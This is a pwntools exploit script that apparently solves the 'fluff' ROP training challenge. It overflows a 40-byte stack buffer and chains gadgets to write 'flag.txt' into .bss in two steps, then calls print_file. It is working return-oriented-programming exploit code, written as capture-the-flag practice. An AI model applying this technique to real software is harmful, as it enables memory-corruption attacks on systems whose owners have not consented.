from pwn import *
import os

os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF("./fluff")
context.arch = "amd64"
context.os = "linux"
context.terminal = ["st", "--", "/bin/sh", "-c"]

offset = 40


# elements to use in the ROP chain

rbp_offset = 0x48
pop_rbp = 0x400588
mov_rbp_edx = 0x400606 # calls pwnme
pop_rdx_rcx = 0x40062a

bss_addr = elf.bss()
dummy = 0x696969

pop_rdi = 0x4006a3
print_file = 0x400510

flag = b"flag.txt"


payload_1 = flat(
        # first phase, because we are using only 4 bytes (ebx) we have to load the "flag.txt" string in two steps
        b'a' * offset,
        p64(pop_rbp),
        p64(bss_addr - rbp_offset),
        p64(pop_rdx_rcx),
        b'flagflag',
        p64(dummy),
        p64(mov_rbp_edx),
        )

payload_2 = flat(
        b'b' * offset,
        p64(pop_rbp),
        p64(bss_addr - rbp_offset + 4),
        p64(pop_rdx_rcx),
        b'.txtflag',
        p64(dummy),
        p64(mov_rbp_edx),
        )

payload_3 = flat(
        b'c' * offset,
        p64(pop_rdi),
        p64(bss_addr),
        p64(print_file)
        )


gdb_script = '''
        break *pwnme+150
        continue
    '''

io = gdb.debug(elf.path, gdbscript=gdb_script)
#io = elf.process()


# because the only move [reg], reg instruction that we can control has a call 0x500 after it, and we have to use EBX (3 bytes instead of the normal 8)  we will split our exploit into 3 different phases
# PHASE I: we will have save "flag" in .bss
# PHASE II: we will append ".txt" to the file name string
# PHASE III: we will call print_file

pause()

print(io.recv().decode())

pause()
print("Sending payload #1")

io.sendline(payload_1)

pause()
print("Sending payload #2")

io.sendline(payload_2)

pause()
print("Sending payload #3")

io.sendline(payload_3)

pause()

print(io.recv().decode())

pause()

